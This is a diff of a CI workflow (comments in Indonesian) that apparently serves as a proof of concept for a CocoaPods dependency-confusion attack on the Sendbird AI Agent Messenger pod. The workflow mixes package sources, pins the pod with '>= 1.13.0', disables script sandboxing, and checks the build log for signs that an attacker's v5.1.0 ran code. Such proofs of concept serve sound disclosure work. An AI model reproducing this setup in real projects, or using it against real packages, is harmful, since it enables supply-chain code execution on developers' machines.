@@ -16,47 +16,51 @@ jobs:
           flutter create . --platforms=ios
           
           cd ios
-          # 1. SETUP PODFILE PERSIS DOKUMENTASI RESMI
-          # Kita masukin kedua source-nya
-          echo "source 'https://github.com/sendbird/sendbird-ios-distribution.git'" > Podfile
-          echo "source 'https://cdn.cocoapods.org/'" >> Podfile
-          echo "platform :ios, '15.0'" >> Podfile
+          # Kita hapus Podfile lama biar bersih
+          rm -f Podfile
           
-          echo "target 'Runner' do" >> Podfile
-          echo "  use_frameworks!"
-          # INI ADALAH BARIS DARI README RESMI MEREKA
-          echo "  pod 'SendbirdAIAgentMessenger', '>= 1.13.0'" >> Podfile
-          echo "end" >> Podfile
+          # Gunakan cat EOF biar spasi dan karakter khusus aman
+          cat <<EOF > Podfile
+source 'https://github.com/sendbird/sendbird-ios-distribution.git'
+source 'https://cdn.cocoapods.org/'
 
-          # 2. DISABLE SANDBOX (Instruksi Resmi Sendbird)
-          cat <<EOF >> Podfile
+platform :ios, '15.0'
+
+target 'Runner' do
+  use_frameworks!
+  # DOKUMENTASI RESMI SENDBIRD
+  pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
+end
+
 post_install do |installer|
   project = installer.aggregate_targets[0].user_project
   project.targets.each do |target|
-      target.build_configurations.each do |config|
-          config.build_settings['ENABLE_USER_SCRIPT_SANDBOXING'] = 'NO'
-      end
+    target.build_configurations.each do |config|
+      config.build_settings['ENABLE_USER_SCRIPT_SANDBOXING'] = 'NO'
+    end
   end
   project.save
 end
 EOF
 
-          # 3. INSTALLATION: The Moment of Truth
-          pod install --repo-update
-          
-          # 4. VERIFIKASI VERSI DI PODFILE.LOCK
-          echo "=== ACTUAL RESOLVED VERSION ==="
-          RESOLVED_VERSION=$(grep "SendbirdAIAgentMessenger (" Podfile.lock | head -1)
-          echo "Resolved: $RESOLVED_VERSION"
+          echo "=== PODFILE CREATED ==="
+          cat Podfile
 
-          # 5. TRIGGER BUILD (RCE CHECK)
+          # 3. INSTALLATION
+          pod install --repo-update || exit 1
+          
+          # 4. VERIFIKASI VERSI
+          echo "=== ACTUAL RESOLVED VERSION ==="
+          grep "SendbirdAIAgentMessenger (" Podfile.lock | head -1
+          
+          # 5. TRIGGER BUILD RCE
+          echo "=== Launching Build ==="
           flutter build ios --debug --no-codesign --verbose 2>&1 | tee build.log || true
           
           # 6. FINAL JUDGEMENT
-          if echo "$RESOLVED_VERSION" | grep -q "5.1.0"; then
-            echo "✅ TRUTH: CocoaPods prioritized Attacker's v5.1.0 over Official v1.13.0!"
-            echo "✅ IMPACT: Remote Code Execution triggered successfully."
+          if grep -q "Messenger UI Audit" build.log; then
+            echo "✅ RCE SUCCESS: Attacker's v5.1.0 executed!"
           else
-            echo "❌ FAILED: System picked official version."
+            echo "❌ RCE FAILED: Check logs."
             exit 1
           fi
